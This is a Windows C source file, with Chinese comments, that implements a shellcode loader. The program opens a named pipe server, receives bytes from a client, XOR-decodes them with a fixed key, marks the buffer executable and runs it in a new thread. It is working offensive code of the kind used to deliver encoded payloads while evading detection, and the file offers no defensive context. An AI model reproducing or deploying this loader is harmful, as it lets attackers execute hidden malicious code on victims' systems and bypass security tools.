/*
vs2019
多字节字符集
x86
debug
运行库: /MTd
*/
#pragma warning(disable:6031)
#include <Windows.h>
#include <stdio.h>
#include <intrin.h>
#include <winternl.h>
#include <wchar.h>

#define BUFF_SIZE 1024
PTCHAR ptsPipeName = TEXT("\\\\.\\pipe\\demo1");
 

//此刻我是服务端
int main( ) 
{
    HANDLE hPipe;
    DWORD dwError;
    CHAR szBuffer[BUFF_SIZE];
    DWORD dwLen;
    PCHAR pszShellcode = NULL;
    DWORD dwOldProtect; // 内存页属性
    HANDLE hThread;
    DWORD dwThreadId;

 
    //创建一个命名管道
    hPipe = CreateNamedPipe(
        ptsPipeName,
        PIPE_ACCESS_INBOUND,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        BUFF_SIZE,
        BUFF_SIZE,
        0,
        NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        dwError = GetLastError();
        printf("[-]Create Pipe Error : %d \n", dwError);
        return dwError;
    }

    if (ConnectNamedPipe(hPipe, NULL) > 0)
    {
        printf("[+]Client Connected...\n");
        ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
        printf("[+]Get DATA Length : %d \n", dwLen);

        // 申请内存页
        pszShellcode = (PCHAR)VirtualAlloc(NULL, dwLen, MEM_COMMIT, PAGE_READWRITE);


        if (pszShellcode)
        {
            // 拷贝内存
            CopyMemory(pszShellcode, szBuffer, dwLen);
            for (DWORD i = 0; i < dwLen; i++)
            {
                //Sleep(50);//为什么要睡觉?不太知道的
                _InterlockedXor8(pszShellcode + i, 0x17);
            }
            // 这里开始更改它的属性为可执行
            VirtualProtect(pszShellcode, dwLen, PAGE_EXECUTE, &dwOldProtect);
            // 执行Shellcode
            hThread = CreateThread(
                NULL, // 安全描述符
                NULL, // 栈的大小
                (LPTHREAD_START_ROUTINE)pszShellcode, // 函数
                NULL, // 参数
                NULL, // 线程标志
                &dwThreadId // 线程ID
            );
            if (hThread) {
                WaitForSingleObject(hThread, INFINITE);
            }
        }
    }
    
    return 0;
}


